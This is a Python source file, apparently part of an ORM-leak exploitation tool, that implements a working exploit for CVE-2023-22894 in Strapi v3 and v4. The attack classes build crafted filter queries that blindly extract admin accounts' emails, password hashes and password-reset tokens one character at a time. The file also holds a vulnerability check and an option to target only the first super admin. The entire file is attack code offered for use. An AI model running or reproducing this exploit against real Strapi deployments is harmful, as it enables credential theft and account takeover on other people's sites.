import urllib.parse as urlparse
import string

from argparse import ArgumentParser
from colorama import Fore, Style
from requests import Response

from requests.models import Response

from plormber.attacks.base import BaseORMLeakAttack
from plormber.attacks.exceptions import NotVulnerable
from plormber.attacks.blind.strapi.exceptions import SeenEmailAlready

class StrapiV4Attack(BaseORMLeakAttack):
    command_name = 'strapi-v4-cve-2023-22894'
    command_description = 'Exploits CVE-2023-22894 on Strapi v4.x'

    user_fields = ["createdBy", "updatedBy"]
    id_filter_template = "filters[$and][][id]={id}"
    admin_filter_template = "filters[$and][][{user_field}][roles]=1"
    dump_filter_template = "filters[$and][][{user_field}][{dump_field}][$contains]="
    pagination_template = "pagination[page]={page_number}"
    not_seen_email_template = "filters[$and][][{user_field}][email][$notIn][]={seen_email}"
    dump_fields = ["email", "password", "reset_password_token"]
    dump_field_chars = [
        string.ascii_letters + string.digits + "@.",
        string.ascii_letters + string.digits + "$./=",
        string.hexdigits
    ]
    dump_field_prefix = ""

    def __init__(self, dump_first_admin: bool=False, **kwargs):
        super().__init__(**kwargs)
        # Disabled for Strapi exploitation since this module just dumps admin account information
        self.dumped_prefix = ""
        self.dump_first_admin = dump_first_admin
        self.is_contains_attack = True
        self.item_ids = []
        self.seen_emails = []
        self.user_field = None
        self.id_filter = None
        self.dump_filter = None


    def send_request(self, payload: str) -> Response:
        return self.request('GET', f'{self.target}?{payload}')


    def was_success_result(self, resp: Response) -> bool:
        data = self.fetch_data_response(resp)
        return len(data) > 0
    

    def create_payload(self, test_value: str) -> str:
        return '&'.join([
            self.id_filter,
            self.dump_filter + urlparse.quote_plus(test_value)
        ])
    

    def strapi_setup(self):
        # Check it is actually a vulnerable version
        test_dump_filter = self.dump_filter_template.format(
            user_field=self.user_fields[0],
            dump_field=f"{self.dump_field_prefix}email"
        )

        # All emails have the '@' character
        r = self.send_request(test_dump_filter + "@")
        if not self.was_success_result(r):
            raise NotVulnerable("Not vulnerable to Strapi ORM Leak vulnerabilities")
        
        r = self.send_request(test_dump_filter + "DEFINITELY NOT IN AN EMAIL")
        if self.was_success_result(r):
            raise NotVulnerable("Not vulnerable to Strapi ORM Leak vulnerabilities")
        
        # Get all of the IDs of publicly accessible items
        r = self.send_request(
            self.pagination_template.format(page_number=1)
        )

        self.item_ids = [d["id"] for d in self.fetch_data_response(r)]
        total_pages = self.get_total_pages_from_response(r)
        
        for page_number in range(2, total_pages):
            r = self.send_request(
                self.pagination_template.format(page_number=page_number)
            )
            self.item_ids.extend([d["id"] for d in self.fetch_data_response(r)])
        
    
    def made_by_super_admin(self, user_field: str) -> bool:
        admin_filter = self.admin_filter_template.format(user_field=user_field)
        payload = '&'.join([self.id_filter, admin_filter])
        return self.was_success_result(self.send_request(payload))


    def dump_user_details(self):
        dumped_email = None
        for dump_field, chars in zip(self.dump_fields, self.dump_field_chars):
            self.chars = chars
            self.dump_filter = self.dump_filter_template.format(
                user_field=self.user_field,
                dump_field=f"{self.dump_field_prefix}{dump_field}"
            )
            try:
                print(f"{Fore.GREEN}{Style.BRIGHT}dumping {Fore.CYAN}{dump_field}{Style.RESET_ALL}")
                dumped_value = super().exploit()
            except SeenEmailAlready:
                print(f"{Style.DIM}skipping since we have already dumped that account's data{Style.RESET_ALL}")
                return
            except Exception as e:
                self.print_fail_msg(e)

            if dump_field == "email":
                dumped_email = dumped_value

        if dumped_email is not None:
            self.seen_emails.append(dumped_email)


    def handle_pre_check_fail(self, exception: Exception):
        raise exception


    def pre_checks(self):
        payload = '&'.join([
            self.not_seen_email_template.format(
                user_field=self.user_field,
                seen_email=seen_email
            )
                for seen_email in self.seen_emails
        ])

        if not self.was_success_result(self.send_request(payload)):
            raise SeenEmailAlready("Already dumped that email")


    def exploit(self):
        try:
            self.strapi_setup()
        except NotVulnerable as _e:
            self.print_fail_msg("Not vulnerable to CVE-2023-22894!")
            return
        for item_id in self.item_ids:
            self.id_filter = self.id_filter_template.format(id=item_id)

            for user_field in self.user_fields:
                if self.dump_first_admin and not self.made_by_super_admin(user_field):
                    continue
                self.user_field = user_field
                self.dump_user_details()
                if self.dump_first_admin:
                    return


    def fetch_data_response(self, res: Response) -> list:
        r_json: dict = res.json()
        return r_json.get("data", [])
    

    def get_total_pages_from_response(self, res: Response) -> int:
        r_json: dict = res.json()
        return r_json["meta"]["pagination"]["pageCount"]
    

    @classmethod
    def add_options(cls, parser: ArgumentParser) -> ArgumentParser:
        # Ignore the char options since this exploit will set its own char list during exploitation
        parser = super().add_options(parser, ignore_chars_option=True)

        parser.add_argument(
            '--dump-first-admin',
            help='Only dumps the details of the first Strapi administrator that is found instead of all account data.'
        )

        return parser
    

class StrapiV3Attack(StrapiV4Attack):
    command_name = 'strapi-v3-cve-2023-22894'
    command_description = 'Exploits CVE-2023-22894 on Strapi v3.x'

    user_fields = ["created_by", "updated_by"]

    id_filter_template = "id={id}"
    admin_filter_template = "{user_field}.roles=1"
    not_seen_email_template = "filters[$and][][email][$notIn][]={seen_email}"
    dump_filter_template = "{user_field}.{dump_field}_containss={test_value}"
    dump_fields = ["email", "password", "reset_password_token"]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
    

    def fetch_data_response(self, res: Response) -> list:
        r_json: dict = res.json()
        return r_json